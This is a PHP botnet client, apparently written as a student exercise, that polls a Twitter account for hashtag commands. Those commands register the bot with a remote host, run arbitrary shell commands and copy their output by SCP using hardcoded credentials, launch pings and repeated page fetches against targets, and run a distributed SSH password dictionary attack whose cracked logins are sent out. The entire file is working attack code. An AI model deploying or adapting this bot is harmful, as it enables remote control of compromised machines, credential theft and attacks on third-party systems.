<?php

$S = false;
$P = false;
$I = false;
$PING = false;
$G = false;
$PASS = false;
$id = 0;

while (true) {
	$twitter = file_get_contents('https://twitter.com/SRS11UPNA');
	$sacarTweet = explode('<p class="TweetTextSize', $twitter);
	$sacarTweet2 = explode('</p>', $sacarTweet[1]);
	$sacarTweet3 = explode('data-aria-label-part="0">', $sacarTweet2[0]);
	$sacarHashtag = explode('#', $sacarTweet3[1]);
	
	$HashTag = array();

	for ($i=1; $i < count($sacarHashtag); $i++) { 
		$sacarHashtag2 = explode('</b>', $sacarHashtag[$i]);
		$sacarHashtag3 = explode('<b>', $sacarHashtag2[0]);
		array_push($HashTag, $sacarHashtag3[1]);
	}
	
	$sacarComando = explode('</b></a>', $sacarHashtag[count($sacarHashtag)-1]);
	$sacarComando2 = explode('</p>', $sacarComando[count($sacarComando)-1]);
	$Comando = $sacarComando2[0];

	for ($i=0; $i < count($HashTag); $i++) { 


		if ($HashTag[$i]=='I' && !$I) {

			$id = rand(1000000000,9999999999);
			$ComandoPartes = explode(' ', $Comando);
			$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
			socket_connect($sock, $ComandoPartes[1], $ComandoPartes[2]);
			socket_write($sock, $id);
			socket_close($sock); 
			$I = true;

		}

		if ($HashTag[$i]=='S' && !$S) {

			system($Comando.' > /tmp/'.$id);
			$connection = ssh2_connect('127.0.0.1', 22);
			ssh2_auth_password($connection, 'hack', '12345');
			ssh2_scp_send($connection, '/tmp/'.$id, '/home/hack/'.$id, 0644);
			$S = true;

		}
		
		if ($HashTag[$i]=='P' && !$P) {

			system('gnome-terminal -e "bash script.sh"');
			$P = true;

		}

		if ($HashTag[$i]=='PING' && !$PING) {
			
			$ComandoPartes = explode(' ', $Comando);
			system('ping '.$ComandoPartes[1].' -c '.$ComandoPartes[2]);
			$PING = true;

		}

		if ($HashTag[$i]=='G' && !$G) {

			$sacarPagina = explode('data-expanded-url="', $Comando);
			$sacarPagina2 = explode('" class', $sacarPagina[1]);
			$sacarBucle = explode(' ', $Comando);
			for ($j=0; $j < $sacarBucle[count($sacarBucle)-3]; $j++) { 
				echo file_get_contents($sacarPagina2[0]);
				sleep($sacarBucle[count($sacarBucle)-2]);
			}
			$G = true;

		}

		if ($HashTag[$i]=='PASS' && !$PASS) {

			$PASS = true;
			$ComandoPartes = explode(' ', $Comando);
			$IP = $ComandoPartes[1];
			$usuario = $ComandoPartes[2];
			if (strpos($Comando, '<a')) {

				$sacarDiccionario = explode('data-expanded-url="', $Comando);
				$sacarDiccionario2 = explode('" class', $sacarDiccionario[1]);
				$diccionario = $sacarDiccionario2[0];
				$sacarIDs = explode('</a>', $Comando);
				$sacarIDs2 = explode(' ', $sacarIDs[1]);
				for ($p=1; $p < (count($sacarIDs2)-1); $p++) { 
					if ($sacarIDs2[$p]==$id) {
						$posicion = $p;
					}
				}
				$total = count($sacarIDs2)-2;

			}else{

				$diccionario = $ComandoPartes[3];
				$posicion = 0;
				for ($k=4; $k < (count($ComandoPartes)-1); $k++) { 
					if ($ComandoPartes[$k]==$id) {
						$posicion = $k - 3;
					}
				}

				$total = count($ComandoPartes) - 5;

			}

			echo $posicion;
			echo $total;

			if ($posicion != 0) {

				$passwords = fopen($diccionario, 'r');
				$linea = fgets($passwords);

				$primeraVez = true;
				$cont = 0;

				while ($linea!=null) {

				$connection = ssh2_connect($IP, 22);


					if ($primeraVez) {

						for ($l=1; $l < $posicion; $l++) { 

							$linea = fgets($passwords);

						}	

						$primeraVez = false;					

					}else{

						for ($l=0; $l < $total; $l++) { 
							
							$linea =fgets($passwords);

						}

					}

					$linea = trim($linea);
					$cont++;

					if (ssh2_auth_password($connection, $usuario, $linea)){

						$passRight = fopen('/tmp/passRight.txt', 'w');
						fwrite($passRight, 'IP: '.$IP.', user: '.$usuario.', pass: '.$linea. ', maquina: '.$posicion."\n");
						fclose($passRight);
						$connection = ssh2_connect('127.0.0.1', 22);
						ssh2_auth_password($connection, 'hack', '12345');
						ssh2_scp_send($connection, '/tmp/passRight.txt', '/home/hack/passRight.txt', 0644);
						break;


					}else{

						if ($cont==20) {
							$cont=0;
							$twitter = file_get_contents('https://twitter.com/SRS11UPNA');
							$sacarTweet = explode('<p class="TweetTextSize', $twitter);
							$sacarTweet2 = explode('</p>', $sacarTweet[1]);
							$sacarTweet3 = explode('data-aria-label-part="0">', $sacarTweet2[0]);
							$sacarHashtag = explode('#', $sacarTweet3[1]);
							
							$HashTag = array();

							for ($i=1; $i < count($sacarHashtag); $i++) { 
								$sacarHashtag2 = explode('</b>', $sacarHashtag[$i]);
								$sacarHashtag3 = explode('<b>', $sacarHashtag2[0]);
								array_push($HashTag, $sacarHashtag3[1]);
							}
							
							/*$sacarComando = explode('</b></a>', $sacarHashtag[count($sacarHashtag)-1]);
							$sacarComando2 = explode('</p>', $sacarComando[count($sacarComando)-1]);
							$Comando = $sacarComando2[0];*/
							if (in_array('R', $HashTag)) {
								break;
							}
							
						}

					}

				}

			}

		}

		if ($HashTag[$i]=='R') {

			$PASS = false;
			$S = false;
			$P = false;
			$I = false;
			$PING = false;
			$G = false;

		}

	}

	sleep(5);

}
?>